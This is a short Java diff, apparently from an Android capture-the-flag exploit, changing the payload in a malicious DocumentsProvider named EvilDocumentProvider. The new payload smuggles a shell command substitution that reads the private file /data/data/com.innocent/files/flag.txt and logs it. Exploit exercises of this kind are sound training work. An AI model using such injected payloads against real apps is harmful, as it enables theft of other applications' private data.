@@ -109,7 +109,7 @@ public class EvilDocumentProvider extends android.provider.DocumentsProvider {
         try {
             if (!file.exists()) file.createNewFile();
             try (FileOutputStream out = new FileOutputStream(file)) {
-                String payload = "cat flag.txt";
+                String payload = "log \"$(cat /data/data/com.innocent/files/flag.txt)\"";
                 out.write(payload.getBytes());
             }
         } catch (IOException e) {
